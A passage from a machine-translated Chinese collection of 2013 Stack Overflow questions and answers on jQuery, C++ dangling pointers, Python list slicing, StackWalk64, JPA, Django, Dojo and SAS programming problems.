$('.spin').spinner();
} 
```

这没有任何问题。但是当我在“正常”jquery请求（不是ajaxy请求）上调用相同的函数时，它不再起作用了：

```
$.ajax({
    type: "GET",
    url: url,
    cache: false,
    dataType:"json",
        success: function(res) {
            updateTarget(res,target,animation);
            updater();
        }
    }
}); 
```

我真的不明白为什么在一种情况下它有效，而在另一种情况下却没有......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T12:20:27.530

我已经弄清楚了...我的错误是我在运行`updater()`之后`updateTarget(res,target,animation);`，这是分析json响应并将html元素附加到页面的函数，而我必须`updater()`在`updateTarget(res,target,animation);`通过`.html()`.

# c++ - 为什么我的数据成员即使在构建后也是空的？

> ID：15650513
> 
> 赞同：0
> 
> 时间：2013-03-27T01:34:18.443
> 
> 标签：c++

我已经包含了 Question 类的定义及其实现，第一个是头文件，第二个是 cpp 文件。

我发表评论以显示问题所在。出于某种原因，在构造函数下，我可以很好地计算 questionText，但是当我尝试在 getQuestionText 函数下执行此操作时，它只会输出一个空字符串？非常感激任何的帮助！！谢谢！

```
#include <string>
#include <vector>
#include <iostream>

using namespace std;

#ifndef QUESTION_H
#define QUESTION_H

class Question{
public:
    Question(int thePointValue, int theChapterNumber, \
        string theQuestionText);
    int getPointValue() const;
    int getChapterNumber() const;
    string getQuestionText() const;
    virtual void writeQuestion(ostream& outfile) const;
    virtual void writeKey(ostream& outfile) const;

private:
    int pointValue;
    int chapterNumber;
    string questionText;

    void writePointValue(ostream& outfile) const;
};

#endif

#include "Question.h"

Question::Question(int thePointValue, int theChapterNumber, \
        string theQuestionText)
{
    pointValue = thePointValue;
    chapterNumber = theChapterNumber;
    questionText = theQuestionText;

        //HERE THIS WORKS PERFECTLY
        cout << questionText << endl;
}

int Question::getPointValue() const
{
    return pointValue;
}

int Question::getChapterNumber() const
{
    return chapterNumber;
}

string Question::getQuestionText() const
{
        //THIS IS THE PROBLEM. HERE IT OUPUTS AN EMPTY STRING NO MATTER WHAT!
        cout << questionText << endl;
    return questionText;
}

void Question::writeQuestion(ostream& outfile) const
{
    writePointValue(outfile);
    outfile << questionText << endl;
}

void Question::writeKey(ostream& outfile) const
{
    writePointValue(outfile);
    outfile << endl;
}

void Question::writePointValue(ostream& outfile) const
{
    string pt_noun;

    if (pointValue == 1)
        pt_noun = "point";
    else
        pt_noun = "points";

    outfile << "(" << pointValue << " " << pt_noun << ") ";
}

vector<Question *> QuestionsList(string filename, int min, int max)
{
vector<Question *> QuestionList;

string line;
vector<string> text;
ifstream in_file;
in_file.open(filename.c_str());
while (getline(in_file, line))
{
    text.push_back(line);
}

string type;
for(int i = 0; i < text.size(); i ++)
{
    int num = text[i].find('@');
    type = text[i].substr(0, num);
    if (type == "multiple")
    {
        MultipleChoiceQuestion myq = matchup(text[i]);
        MultipleChoiceQuestion* myptr = &myq;
        if (myq.getChapterNumber() >= min && myq.getChapterNumber() <= max)
        {
            QuestionList.push_back(myptr);
        }
    }
    if (type == "short")
    {
        ShortAnswerQuestion myq = SAmatchup(text[i]);
        ShortAnswerQuestion* myptr = &myq;
        if (myq.getChapterNumber() >= min && myq.getChapterNumber() <= max)
        {
            QuestionList.push_back(myptr);
        }
    }
    if (type == "long")
    {
        LongAnswerQuestion myq = LAmatchup(text[i]);
        LongAnswerQuestion* myptr = &myq;
        if (myq.getChapterNumber() >= min && myq.getChapterNumber() <= max)
        {
            QuestionList.push_back(myptr);
        }
    }
    if (type == "code")
    {
        CodeQuestion myq = CODEmatchup(text[i]);
        CodeQuestion* myptr = &myq;
        if (myq.getChapterNumber() >= min && myq.getChapterNumber() <= max)
        {
            QuestionList.push_back(myptr);
        }
    }
    cout << QuestionList[QuestionList.size()-1]->getQuestionText() << endl;
}
for (int i = 0; i < QuestionList.size(); i ++)
{
    int numm = QuestionList.size();
    cout << QuestionList[numm-1]->getQuestionText() << endl;
}
return QuestionList; 
```

}

然后当我在 main 中调用它时，代码会中断

```
vector<Question *> list = QuestionsList(pool_filename, min_chapter, max_chapter);
cout << list[0]->getQuestionText() << endl; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:38:42.017

您在代码中多次声明本地对象并将它们的指针存储到`QuestionList`向量（由函数返回）中，该向量在函数块的末尾将包含[*悬空指针*](http://en.wikipedia.org/wiki/Dangling_pointer)。

```
MultipleChoiceQuestion myq = matchup(text[i]); // < local object
MultipleChoiceQuestion* myptr = &myq; // < pointer to local object

QuestionList.push_back(myptr); // < push back into vector 
```

此时，您可以使用[*动态内存分配*](http://www.cplusplus.com/doc/tutorial/dynamic/)（我建议您不要这样做，除非您绝对强制，即使在这种情况下使用标准库提供的[*智能指针*](https://stackoverflow.com/questions/106508/what-is-a-smart-pointer-and-when-should-i-use-one)之一）或将对象直接存储在向量中。

# python - 'int' 对象不可下标

> ID：15650516
> 
> 赞同：1
> 
> 时间：2013-03-27T01:34:36.700
> 
> 标签：python, matrix

我以正方形形式打印矩阵的代码如下：

```
for i in range(len(A)):
    line = "\t|"+str(A[i][0])
    for j in range(1, len(A[i])):
        line = line + "\t" + str(A[i][j])
    line = line + "|"
    print(line) 
```

其中 A 是列表 [22, 38, 30, 58, 34, 69]

它应该看起来像

|22 38|

|30 58|

|34 69|

它不断返回'int'对象不可为代码中的行下标：

```
 line = "\t|"+str(A[i][0]) 
```

我该如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:42:48.017

`A`是一个列表——一个一维数组。`A[0]`是一个`int`，它是不可下标的。因此你的错误。

在 python 中将矩阵表示为二维列表更为自然，例如：

```
A = [[22, 38], [30, 58], [34, 69]] 
```

或者

```
A = [[22, 30, 34], [38, 58, 69]] 
```

如果您这样做，您的代码将起作用，尽管使用这样的代码会更好：

```
def print_matrix(M):
    for N in M:
        print("|{}|".format('\t'.join(str(O) for O in N)))

print_matrix(A) 
```

甚至只是：

```
from pprint import pprint
pprint(A) 
```

如果您与 A 的一维性相关，您可以像这样打印它：

```
def print_list_matrix(M, width):
    for i, j in zip(range(0, len(M), width), range(skip, len(M)+width, width)):
        print('|{}|'.format("\t".join(str(O) for O in M[i:j]))) 
```

或者像这样：

```
def print_list_matrix(M, width):
    for i in range(0, len(M), width):
        print('|{}|'.format("\t".join(str(O) for O in M[i:i+width]))) 
```

或者，如果您想避免切片：

```
from itertools import izip

def grouper(seq, size):
    iters = [iter(seq)] * size
    return izip(*iters)

def print_list_matrix(M, width):
    for N in grouper(M, width):
        print('|{}|'.format("\t".join(str(O) for O in N))) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T01:45:06.160

问题是您尝试使用普通列表作为矩阵，您可以使其不普通或使用正确的索引。例如，您可以尝试这样的事情：

```
A = [22, 38, 30, 58, 34, 69]
size = 2 # put here the exact number of values within each row you want

for i in range(0, len(A), size):
    print '\t'.join(map(str, res[i:i+size])) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T01:40:38.587

什么语言？

不管，

我假设您的输入是*一个*二维数组，但它只是一个一维数组。或者您的代码*旨在*处理一维数组以使其“看起来”二维。

但实际上，您的代码正在尝试处理一个不存在的二维数组，因为您的输入数组是一维的。

如果这个答案没有给你足够的纠正，那么请将语言作为标签和代码包含在你的原始问题中（编辑它），然后向@Sepster 添加评论，我会再看一遍。

编辑：错过的 OP 已经说明*A 是列表 [22, 38, 30, 58, 34, 69]*。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-27T01:39:25.010

python的困难在于你不能使用二维来指定列表。只允许一个维度。所以

> A[0]=22

但

> A[0][1]

抛出错误。要指定双下标，可以使用字典

# ios - IOS In App Purchase：我可以让用户再次购买相同的产品吗？

> ID：15650525
> 
> 赞同：-1
> 
> 时间：2013-03-27T01:35:19.713
> 
> 标签：ios, in-app-purchase

我正在尝试（成功）遵循一些 IAP IOS 教程的指导，例如： [http ://www.raywenderlich.com/21081/introduction-to-in-app-purchases-in-ios-6-tutorial](http://www.raywenderlich.com/21081/introduction-to-in-app-purchases-in-ios-6-tutorial)

我的问题是：我想让用户再次购买他已经购买的相同产品 - 这可能在消耗品方法上吗？（我正在寻找 2 天的答案，但还没有太多。）

目标是让用户从数百种可用产品中购买产品（因此我不想在 Itune Connect 中创建数百个产品标识符，因此我对所有产品使用相同的产品 ID 并在内部保持与真实产品的关联（据Apple所知，用户再次购买了相同的产品......））

提前致谢...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-28T23:26:22.010

好吧，在花了几天时间解决这个问题之后 - 我刚刚意识到这不是问题：如果您在首次购买后不久重新购买商品，显然 Apple 不会要求您提供 Apple ID 甚至密码。

你知道那是什么意思（实际上你真的知道 - 我不知道:)），从现在开始买东西后，我会让我的 iPhone 远离我儿子...... :)

结案。

# c++ - Stackwalk64 可以在 64 位 Windows 上运行吗？

> ID：15650528
> 
> 赞同：-6
> 
> 时间：2013-03-27T01:35:25.797
> 
> 标签：c++, winapi

Stackwalk64 能否在 Windows Server 2012 和 2008R2 上运行？我无法让这段代码工作。这里的其他人有它的工作吗？我用它为另一个线程生成堆栈跟踪。

我在用着：

```
myframe.AddrPC.Mode = AddrModeFlat;
myframe.AddrFrame.Mode = AddrModeFlat;
myframe.AddrStack.Mode = AddrModeFlat;
myframe.AddrPC.Offset = context.Rip;
myframe.AddrFrame.Offset = context.Rbp;
myframe.AddrStack.Offset = context.Rsp;             

while(pStackWalk64(IMAGE_FILE_MACHINE_AMD64, GetCurrentProcess(), handleforanotherthread,&myframe,
    &context, NULL, funcTableAccess, SymGetModuleBase64, NULL))
{
    if(myframe.AddrPC.Offset == myframe.AddrReturn.Offset)
        break;
} 
```

它失败并且返回的地址无效。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-27T01:48:24.463

这是我们的代码版本。原文来自 MSJ 的一篇文章，但经过大量修改。

```
bool MSJExceptionHandler::ImagehlpStackWalk( PCONTEXT pCtx )
{
    bool result = false;
//  PCONTEXT pContext = pEP->ContextRecord;
    if( m_Levels == 0 ) {
        dbbTrace::OutputWithoutTimestamp( "\nCall stack:\n" );
        dbbTrace::OutputWithoutTimestamp( "Address   Frame\n" );
    }

    // Could use SymSetOptions here to add the SYMOPT_DEFERRED_LOADS flag

    STACKFRAME64 sf;
    bool first = true;
    FIXED_ARRAY( buf, char, 300 );
    size_t buflen = sizeof(buf);
    // Indexes into MSJExceptionHandler data when m_Levels > 0
    int i_line = 0; // Into char * m_Lines[]
    int i_buf = 0;  // into char m_Buffer[]

    memset( &sf, 0, sizeof(sf) );

    // Initialize the STACKFRAME structure for the first call.  This is only
    // necessary for Intel CPUs, and isn't mentioned in the documentation.

    DWORD64 pFrame = 0;
    DWORD64 pPrevFrame = 0;
    sf.AddrPC.Mode         = AddrModeFlat;
    sf.AddrStack.Mode      = AddrModeFlat;
    sf.AddrFrame.Mode      = AddrModeFlat;
#ifdef _M_IX86  // Intel Only!
    sf.AddrPC.Offset       = pCtx->Eip;
    sf.AddrStack.Offset    = pCtx->Esp;
    sf.AddrFrame.Offset    = pCtx->Ebp;
#endif
#ifdef _M_X64  // Intel Only!
    sf.AddrPC.Offset       = pCtx->Rip;
    sf.AddrStack.Offset    = pCtx->Rsp;
    sf.AddrFrame.Offset    = pCtx->Rbp;
#endif
#ifdef _M_IA64
    // Itanium
    DWORD64 pFrame, pPrevFrame;
#pragma message("fix me")
    sf.AddrPC.Offset       = 0;
    sf.AddrStack.Offset    = 0;
    sf.AddrFrame.Offset    = 0;
#endif

#ifdef _M_IX86
    DWORD MachineType = IMAGE_FILE_MACHINE_I386;
#endif
#ifdef _M_X64
    DWORD MachineType = IMAGE_FILE_MACHINE_AMD64;
#endif
#ifdef _M_IA64
    DWORD MachineType = IMAGE_FILE_MACHINE_IA64;
#endif

    while ( 1 )
    {
        SetLastError( 0 );
        if ( ! StackWalk64( MachineType,
                            m_hProcess,
                            GetCurrentThread(),
                            &sf,
                            pCtx,
                            0,
                            SymFunctionTableAccess64,
                            SymGetModuleBase64,
                            0 ) )
            break;

        pFrame = sf.AddrFrame.Offset;
        if ( 0 == pFrame ) // Basic sanity check to make sure
            break;                      // the frame is OK.  Bail if not.

//        dbbTrace::OutputWithoutTimestamp( "%08X  %08X  ", sf.AddrPC.Offset, pFrame );

        if( ! first ) {
            if( pFrame <= pPrevFrame ) {
                // Sanity check
                break;
            }
            if( (pFrame - pPrevFrame) > 10000000 ) {
                // Sanity check
                break;
            }
        }
        if( (pFrame % sizeof(void *)) != 0 ) {
            // Sanity check
            break;
        }

        pPrevFrame = pFrame;
        first = false;

        // IMAGEHLP is wacky, and requires you to pass in a pointer to an
        // IMAGEHLP_SYMBOL structure.  The problem is that this structure is
        // variable length.  That is, you determine how big the structure is
        // at runtime.  This means that you can't use sizeof(struct).
        // So...make a buffer that's big enough, and make a pointer
        // to the buffer.  We also need to initialize not one, but TWO
        // members of the structure before it can be used.

        enum { emMaxNameLength = 512 };
        // Use union to ensure proper alignment
        union {
            SYMBOL_INFO symb;
            BYTE symbolBuffer[ sizeof(SYMBOL_INFO) + emMaxNameLength ];
        } u;
        PSYMBOL_INFO pSymbol = & u.symb;
        pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
        pSymbol->MaxNameLen = emMaxNameLength;

        PDWORD64 symDisplacement = 0;  // Displacement of the input address,
                                    // relative to the start of the symbol

        DWORD lineDisplacement = 0;
        IMAGEHLP_LINE64  line;
        line.SizeOfStruct = sizeof(line);
        line.LineNumber = 0;
        BOOL bLine = FALSE;

        bLine = SymGetLineFromAddr64( m_hProcess, sf.AddrPC.Offset,
            & lineDisplacement, & line );
        if ( SymFromAddr(m_hProcess, sf.AddrPC.Offset,
                                symDisplacement, pSymbol) )
        {
            if( bLine ) {
                _snprintf( buf, buflen,
                    ADDR_FORMAT "  " ADDR_FORMAT "   %s() line %d\n",
                    sf.AddrPC.Offset, pFrame,
                    pSymbol->Name, line.LineNumber );
            } else {
                _snprintf( buf, buflen,
                    ADDR_FORMAT "  " ADDR_FORMAT "  %s() + %X\n",
                    sf.AddrPC.Offset, pFrame,
                    pSymbol->Name, symDisplacement );
            }

        }
        else    // No symbol found.  Print out the logical address instead.
        {
            DWORD err = GetLastError();
            FIXED_ARRAY( szModule , TCHAR, MAX_PATH );
            szModule[0] = '\0';
            DWORD section = 0, offset = 0;

            GetLogicalAddress(  (PVOID)sf.AddrPC.Offset,
                                szModule, sizeof(szModule), section, offset );

            _snprintf( buf, buflen,
                ADDR_FORMAT "  " ADDR_FORMAT "  %04X:%08X %s (err = %d)\n",
                sf.AddrPC.Offset, pFrame,
                section, offset, szModule, err );
            result = true;
        }

        if( m_Levels == 0 ) {
            dbbTrace::OutputString( buf, false );
        } else {
            // Save line
            size_t l = strlen(buf);
            if( i_line >= m_Levels || i_buf + l >= m_Bytes ) {
                // We have saved all of the stack we can save
                break;
            }
            buf[ l - 1 ] = '\0';    // Remove trailing '\n'
            char * s = & m_Buffer[ i_buf ];
            m_Lines[ i_line++ ] = s;
            strncpy( s, buf, l );
            i_buf += l;
        }
    } // while

    return result;
} // MSJExceptionHandler::ImagehlpStackWalk() 
```

# grails - Grails Resources Plugin：在共享插件中定义资源

> ID：15650530
> 
> 赞同：1
> 
> 时间：2013-03-27T01:35:41.737
> 
> 标签：grails, grails-plugin

我有一个 Grails 插件，其中包含在多个 Grails 应用程序之间共享的静态资源（图像、css、js 等）。但是，我在让 Resources 插件工作时遇到问题。在我的共享插件 /conf 中，我有一个 AppResources.groovy 文件，它定义了所有捆绑包等。

我将共享插件添加到我的应用程序中，但是当我启动应用程序时，找不到任何资源：

```
Resource not found: /less/main.less
Resource not found: /js/application.js 
```

我究竟做错了什么？

# java - 无法为 unitName null 检索 EntityManagerFactory

> ID：15650531
> 
> 赞同：0
> 
> 时间：2013-03-27T01:36:01.740
> 
> 标签：java, persistence, java-ee-6

我尝试通过创建一个简单的 Eclipse 动态 Web 项目来使用 JSP。

我制作了一个基本的 JSP 和一个创建对 HttpServlet 的参数化请求的表单。这个 servlet 应该只使用实体 bean 将数据存储到数据库中。

我通过注释使用映射。

这是我的jsp的调用部分：

```
<form action="persistencedemo" method="get">
    <input type="submit" name="submit" value='ok'/>
    <input type="hidden" name="firstName" value='<jsp:getProperty property="firstname" name="newCustomer"/>' />
    <input type="hidden" name="lastName"  value='<jsp:getProperty property="lastname" name="newCustomer"/>' />  
</form> 
```

...这是我的 bean 的主要部分：

```
@Entity
@Table(name="CUSTOMERS")
public class CustomerBean implements Serializable {

@Id
@Column(name = "CUSTOMER_ID")
private Long id;

@Column(name = "FIRST_NAME")
private String firstname;

@Column(name = "LAST_NAME")
private String lastname;

public CustomerBean() {
    this.firstname = "";
    this.lastname = "";
}

    // Getters & Setters 
```

现在 - 最后 - 这是我非常简单的 servlet：

```
@WebServlet(name="PersistenceDemo", urlPatterns = {"/persistencedemo"})
public class PersistenceDemo extends HttpServlet {

    private static final long serialVersionUID = 1L;
    @PersistenceUnit
    private EntityManagerFactory entityManagerFactory;
    @Resource
    private UserTransaction userTransaction;

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {

        EntityManager em = entityManagerFactory.createEntityManager();
        CustomerBean c1 = new CustomerBean();
        CustomerBean c2 = new CustomerBean();

        c1.setFirstname("My");
        c1.setLastname("Self");
        c1.setId(3L);

        c2.setId(4L);
        c2.setFirstname(req.getParameter("firstName"));
        c2.setLastname(req.getParameter("lastName"));

        try {
            userTransaction.begin();
            em.persist(c1);
            em.persist(c2);
            userTransaction.commit();
        }
        catch (Exception e) {
            e.printStackTrace();
        }

        resp.getWriter().print("Updated database!");

    }
} 
```

[更新]我的persistence.xml

```
<?xml version="1.0" encoding="UTF-8" ?>
<persistence xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd"
version="2.0" xmlns="http://java.sun.com/xml/ns/persistence">
    <persistence-unit name="hello-world" transaction-type="RESOURCE_LOCAL">
    <class>com.jpa.PersistenceDemo</class>  
        <properties>

            <property name="javax.persistence.jdbc.url" value="jdbc:mysql://localhost:3306/customerdb" />
            <property name="javax.persistence.jdbc.driver" value="com.mysql.jdbc.Driver" />
            <property name="javax.persistence.jdbc.user" value="customeruser" />
            <property name="javax.persistence.jdbc.password" value="customerpass" />
      </properties>
   </persistence-unit>
</persistence> 
```

**问题**：我链接了 mySQL 连接器并创建了表，但是当我调用*entityManagerFactory.createEntityManager()*时，它总是崩溃并显示错误消息：

```
Unable to retrieve EntityManagerFactory for unitName null 
```

好吧，除了我可能应该使用另一种结构将模型（bean）与视图（jsp）分开之外：

这里有什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-31T19:27:51.013

1.  您的 persistence.xml 文件在哪里？

2.  也许项目结构不正确？EJB 是独立的部分吗？尝试[使用 CDI](http://www.hascode.com/2011/02/creating-a-sample-java-ee-6-blog-application-with-jpa-ejb-cdi-jsf-and-primefaces-on-glassfish/)或[Enterprise Application](http://www.youtube.com/watch?v=32wpTh1TmY4)打包项目的各个部分。

尝试在您编写 Java 的任何程序中创建一个“新企业项目”，如果您不确定我在说什么，请查看自动生成的内容。

# python - django for 循环列表

> ID：15650532
> 
> 赞同：1
> 
> 时间：2013-03-27T01:36:08.420
> 
> 标签：python, django, list, django-templates

我有一个由创建的列表`zip`。

```
list = zip(rating,image,comment) 
```

所有元素都是可迭代的查询集。

图像是这种形式：

```
Class image(request):
  location_id = models.IntegerField()
  bild = models.ImageField(upload_to=".",default='') 
```

因此，一个位置可以有多个图像。

现在我将其渲染`list`为模板并对其进行迭代以显示项目。比如说，一个位置有 2 个图像。我的问题是这样的：

```
 {% for rate, image, comment in list %}
     how do i show here both images of one location? 
     {{image.bild.name}} gives me only the first image
  {% endfor %} 
```

感谢帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:59:56.020

该类`Location`应具有为您提供相关评级/评论/图像的字段或属性。然后，您可以将`Location`s 列表传递给您的模板。

如果`Location`是 Django 模型，那么评级/评论/图像应该每个都有一个`ForeignKey`指向`Location`. 在这种情况下，Django 将在该点上创建属性`Location`，指向相应的评级/评论/图像。用于`related_name`选择该属性的名称，否则 Django 将发明一个名称。

# python - 列表列表的子矩阵（没有 numpy）

> ID：15650538
> 
> 赞同：10
> 
> 时间：2013-03-27T01:36:52.067
> 
> 标签：python, matrix, python-3.x

假设我有一个由列表列表组成的矩阵，如下所示：

```
>>> LoL=[list(range(10)) for i in range(10)]
>>> LoL
[[0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]] 
```

还假设我有一个相同结构的 numpy 矩阵，称为`LoLa`：

```
>>> LoLa=np.array(LoL) 
```

使用 numpy，我可以得到这个矩阵的子矩阵，如下所示：

```
>>> LoLa[1:4,2:5]
array([[2, 3, 4],
       [2, 3, 4],
       [2, 3, 4]]) 
```

我可以像这样在纯 Python 中复制 numpy 矩阵切片：

```
>>> r=(1,4)
>>> s=(2,5)
>>> [LoL[i][s[0]:s[1]] for i in range(len(LoL))][r[0]:r[1]]
[[2, 3, 4], [2, 3, 4], [2, 3, 4]] 
```

这不是世界上最容易阅读也不是最有效的东西:-)

问题：有没有更简单的方法（在纯 Python 中）将任意矩阵切片为子矩阵？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-27T01:46:15.883

```
In [74]: [row[2:5] for row in LoL[1:4]]
Out[74]: [[2, 3, 4], [2, 3, 4], [2, 3, 4]] 
```

* * *

您还可以通过定义以下子类来模仿 NumPy 的语法`list`：

```
class LoL(list):
    def __init__(self, *args):
        list.__init__(self, *args)
    def __getitem__(self, item):
        try:
            return list.__getitem__(self, item)
        except TypeError:
            rows, cols = item
            return [row[cols] for row in self[rows]]

lol = LoL([list(range(10)) for i in range(10)])
print(lol[1:4, 2:5]) 
```

也产生

```
[[2, 3, 4], [2, 3, 4], [2, 3, 4]] 
```

使用`LoL`子类不会赢得任何速度测试：

```
In [85]: %timeit [row[2:5] for row in x[1:4]]
1000000 loops, best of 3: 538 ns per loop
In [82]: %timeit lol[1:4, 2:5]
100000 loops, best of 3: 3.07 us per loop 
```

但速度并不是一切——有时可读性更重要。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-27T01:49:19.703

一方面，您可以`slice`直接使用对象，这有助于提高可读性和性能：

```
r = slice(1,4)
s = slice(2,5)
[LoL[i][s] for i in range(len(LoL))[r]] 
```

如果你只是直接迭代列表列表，你可以写成：

```
[row[s] for row in LoL[r]] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-09-11T22:51:27.087

做这个，

submat = [ [ mat[ i ][ j ] for j in range( index1, index2 ] for i in range( index3, index4 ) ]

submat 将是原始大矩阵的矩形（如果 index3 == index1 和 index2 == index4，则为正方形）块。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-27T01:59:32.840

我不知道它是否更容易，但让我提出一个想法：

```
from itertools import product
r = (1+1, 4+1)
s = (2+1, 5+1)
array = [LoL[i][j] for i,j in product(range(*r), range(*s))] 
```

这是您想要的子矩阵的扁平化版本。

# json - 如何将整个 dojox.grid.DataGrid 存储（项目 json 数据）传递给 servlet？

> ID：15650541
> 
> 赞同：1
> 
> 时间：2013-03-27T01:37:09.630
> 
> 标签：json, datagrid, dojo

我在页面上有一个按钮 - 单击时，它将所有数据传递给可以更新每一行数据的 servlet。我的问题是如何将整个商店作为 json 数据传递给 servlet？有什么简单的方法吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:54:07.897

这是我编写的一些代码，用于将商店获取到一个对象。然后可以使用`dojo.toJson(obj);`. [我最初是从dojotoolkit 网站](http://dojotoolkit.org/reference-guide/1.8/dojo/data/ItemFileWriteStore.html)了解到的。（在信用到期时给予信用）。我意识到这段代码庞大而讨厌。大约一年前，当我寻找更好的方法时，我找不到。

```
JsonHelper.storeToObject = function(store) {
    var object = [];
    var index = -1;
    store.fetch({
        onItem : function(item, request) {
            object[++index] = JsonHelper.itemToObject(store, item);
        }
    });
    return object;
};

JsonHelper.itemToObject = function(store, item) {
    // store:
    // The datastore the item came from.
    // item:
    // The item in question.
    var obj = {};
    if (item && store) {
        // Determine the attributes we need to process.
        var attributes = store.getAttributes(item);
        if (attributes && attributes.length > 0) {
            var i;
            for (i = 0; i < attributes.length; i++) {
                var values = store.getValues(item, attributes[i]);
                if (values) {
                    // Handle multivalued and single-valued attributes.
                    if (values.length > 1) {
                        var j;
                        obj[attributes[i]] = [];
                        for (j = 0; j < values.length; j++) {
                            var value = values[j];
                            // Check that the value isn't another item. If
                            // it is, process it as an item.
                            if (store.isItem(value)) {
                                obj[attributes[i]].push(itemToObject(store,
                                        value));
                            } else {
                                obj[attributes[i]].push(value);
                            }
                        }
                    } else {
                        if (store.isItem(values[0])) {
                            obj[attributes[i]] = itemToObject(store,
                                    values[0]);
                        } else {
                            obj[attributes[i]] = values[0];
                        }
                    }
                }
            }
        }
    }
    return obj;
}; 
```

# sas - 从 SAS 数据集中提取子数据并应用于不同的数据集

> ID：15650542
> 
> 赞同：0
> 
> 时间：2013-03-27T01:37:31.867
> 
> 标签：sas, sas-macro

我编写了一个宏来`proc univariate`计算数据集中变量的自定义分位数（比如`dsn1`）`%cust_quants(dsn= , varlist= , quant_list= )`。输出是一个汇总数据集（比如`dsn2`），如下所示：

```
q_1      q_2.5      q_50      q_80      q_97.5      q_99      var_name
1        2.5        50        80        97.5        99        ex_var_1_100
-2       10         25        150       500         20000     ex_var_pos_skew
-20000   -500       -150      0         10          50        ex_var_neg_skew 
```

我想做的是使用汇总数据集来限制/限制原始数据集中的极值。我的想法是提取感兴趣的列（例如`q_99`）并将其放入宏变量向量中（例如`q_99_1, q_99_2, ..., q_99_n`）。然后我可以执行以下操作：

```
/* create summary of dsn1 as above example */
%cust_quants(dsn= dsn1, varlist= ex_var_1_100 ex_var_pos_skew ex_var_neg_skew, 
             quant_list= 1 2.5 50 80 97.5 99);

/* cap dsn1 var's at 99th percentile */
data dsn1_cap;
  set dsn1;

  if ex_var_1_100 > &q_99_1 then ex_var_1_100 = &q_99_1;
  if ex_var_pos_skew > &q_99_2 then ex_var_pos_skew = &q_99_2;
  /* don't cap neg skew */
run; 
```

在`R`中，很容易做到这一点。可以使用像索引这样的矩阵从数据帧中提取子数据，并将该子数据分配给一个对象。然后可以稍后引用第二个对象。`R`示例——`b`从数据帧中提取`a`：

```
> a <- as.data.frame(cbind(c(1,2,3), c(4,5,6)))
> print(a)
  V1 V2
1  1  4
2  2  5
3  3  6
> a[, 2]
[1] 4 5 6
> b <- a[, 2]
> b[1]
[1] 4 
```

**是否可以在 SAS 中做同样的事情？**我希望能够将一列子数据分配给宏变量/数组，这样我就可以在第二个数据步骤中使用宏/数组。一种想法是`proc sql into:`：

```
proc sql noprint;
  select v2 into :v2_macro separated by " "
  from a;
run; 
```

但是，当我真正想要的是变量向量（或数组——SAS 中没有向量）时，这会创建一个字符串变量。另一个想法是添加`%scan`（假设这是在宏内）：

```
proc sql noprint;
  select v2 into :v2_macro separated by " "
  from a;
run;

%let i = 1;
%do %until(%scan(&v2_macro, &i) = "");
  %let var_&i = %scan(&v2_macro, &i);
  %let &i = %eval(&i + 1);
%end; 
```

这似乎效率低下并且需要大量代码。它还要求程序员记住哪个`var_&i`对应于每个未​​来的目的。有没有更简单/更清洁的方法来做到这一点？

**如果这是足够的背景/示例，请在评论中告诉我。如果需要，我很乐意更完整地描述我为什么要做我正在尝试的事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T06:54:01.587

首先，我假设您在谈论 SAS/Base 而不是 SAS/IML；SAS/IML 本质上类似于 R，并且具有以相同方式可用的相同类型的操作。

SAS/Base 更像是一种数据库语言而不是一种矩阵语言（尽管两者都有一些元素，以及 OOP 语言的一些元素，并且是一种功能齐全的函数式编程语言）。

结果，为了实现相同的目标，您做的事情会有所不同。此外，由于在大型数据表中移动数据的成本，您可以使用多种方法来实现相同的结果；您可以根据需要选择合适的方法。

首先，您通常不应该按照您建议的方式将数据存储在宏变量中。这是不好的编程习惯，而且效率低下（正如您已经注意到的那样）。存在 SAS 数据集来存储数据；SAS 宏变量的存在有助于简化您的编程任务并驱动代码。

如上所述创建数据集“b”在 Base SAS 中是微不足道的：

```
data b;
set a;
keep v2;
run; 
```

这将创建一个与 A 具有相同行但只有第二列的新数据集。KEEP 和 DROP 允许您控制数据集中的列。

但是，除非您打算修改数据，否则此数据集的意义很小；毕竟，它包含与 A 相同的信息，只是更少。因此，例如，如果您想将 V2 合并到另一个数据集中，而不是创建 b，您可以简单地使用带有 A 的数据集选项：

```
data c;
merge z a(keep=v2);
by id;
run; 
```

（注意：我预先假设某种形式的 ID 变量来组合 A 和 Z。）这种合并将 v2 列组合到 z 上，在一个新的数据集 c 中。这相当于垂直连接两个矩阵（尽管直接连接会删除“by id;”要求，在数据库中您通常不会这样做，因为不能保证顺序是您所期望的）。

